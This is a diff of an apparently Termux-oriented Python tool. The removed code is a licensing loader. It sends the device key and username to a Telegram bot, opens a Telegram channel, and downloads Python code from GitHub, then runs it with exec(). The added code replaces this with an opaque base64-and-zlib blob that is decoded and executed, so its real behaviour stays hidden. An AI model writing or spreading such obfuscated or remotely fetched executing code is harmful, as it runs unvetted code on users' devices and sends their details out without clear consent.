@@ -1,95 +1,12 @@
-import os
-import sys
-import time
-import uuid
 
-# --- 1. AUTO INSTALLER ---
+# Encrypted by Jubair Bro (Universal 3.x)
+import zlib, base64, sys
+
 try:
-    import requests
-    from rich.console import Console
-except ImportError:
-    print("Installing libraries...")
-    os.system("pip install requests bs4 rich")
-    import requests
-
-# --- 2. CONFIGURATION ---
-# আপনার গিটহাব লিংকগুলো ঠিকমত বসান
-GITHUB_USERS = "https://raw.githubusercontent.com/jubairbro/access/main/users.txt"
-GITHUB_CODE  = "https://raw.githubusercontent.com/Jubair6460/remote/main/encrypt_source.py"
-GITHUB_JSON  = "https://raw.githubusercontent.com/Jubair6460/remote/main/servers.json"
-
-# আপনার বট তথ্য (সরাসরি বসান)
-BOT_TOKEN = "#" 
-ADMIN_ID = "8486562838"
-CHANNEL = "https://t.me/+5ygHfkZxVBc0Mjdl"
-
-def get_key():
-    path = "/sdcard/.jubair_tool"
-    if not os.path.exists(path): os.makedirs(path)
-    file = f"{path}/key.txt"
-    
-    if os.path.exists(file):
-        with open(file, "r") as f: return f.read().strip()
-    
-    # নতুন কী তৈরি
-    new_key = f"KEY-SENSEI-{str(uuid.uuid4()).split('-')[0].upper()}"
-    with open(file, "w") as f: f.write(new_key)
-    return new_key
-
-def send_request(key):
-    """আপনার বটে কী পাঠিয়ে দিবে"""
-    try:
-        import getpass
-        msg = f"🔔 **Approval Request**\nKey: `{key}`\nUser: {getpass.getuser()}"
-        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
-                      data={'chat_id': ADMIN_ID, 'text': msg, 'parse_mode': 'Markdown'})
-    except: pass
-
-def main():
-    os.system('clear')
-    print("\033[1;32m[●] CONNECTING TO JUBAIR SERVER...\033[0m")
-    
-    # চ্যানেল ওপেন
-    os.system(f"xdg-open {CHANNEL} > /dev/null 2>&1")
-    
-    my_key = get_key()
-    
-    try:
-        # ইউজার লিস্ট চেক
-        users = requests.get(GITHUB_USERS, timeout=10).text
-        
-        if my_key in users:
-            print("\033[1;32m[✓] ACCESS GRANTED\033[0m")
-            time.sleep(0.5)
-            
-            # কোড ডাউনলোড ও রান
-            code = requests.get(GITHUB_CODE).text
-            
-            # সেইফ এক্সিকিউশন (namespace ব্যবহার করে)
-            namespace = {}
-            exec(code, globals(), namespace)
-            
-            # মেইন ফাংশন কল
-            if 'start_scraping' in namespace:
-                namespace['start_scraping'](GITHUB_JSON)
-            else:
-                print("\033[1;31m[!] Error: Main function not found!\033[0m")
-                
-        else:
-            print("\n" + "━"*30)
-            print(f"\033[1;31m[x] DEVICE NOT APPROVED\033[0m")
-            print(f"Key: \033[1;33m{my_key}\033[0m")
-            print("━"*30)
-            
-            print("[!] Sending Request to Admin...")
-            send_request(my_key)
-            print("\033[1;32m[✓] Request Sent! Wait for approval.\033[0m")
-            
-            # অটো কপি
-            os.system(f"termux-clipboard-set {my_key}")
-            
-    except Exception as e:
-        print(f"\033[1;31m[!] Server/Internet Error: {e}\033[0m")
-
-if __name__ == "__main__":
-    main()
+    _d = "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"
+    _c = base64.b64decode(_d)
+    _x = zlib.decompress(_c).decode('utf-8')
+    exec(_x)
+except Exception as e:
+    print(f"\033[1;31m[!] Critical Error: {e}\033[0m")
+    sys.exit()
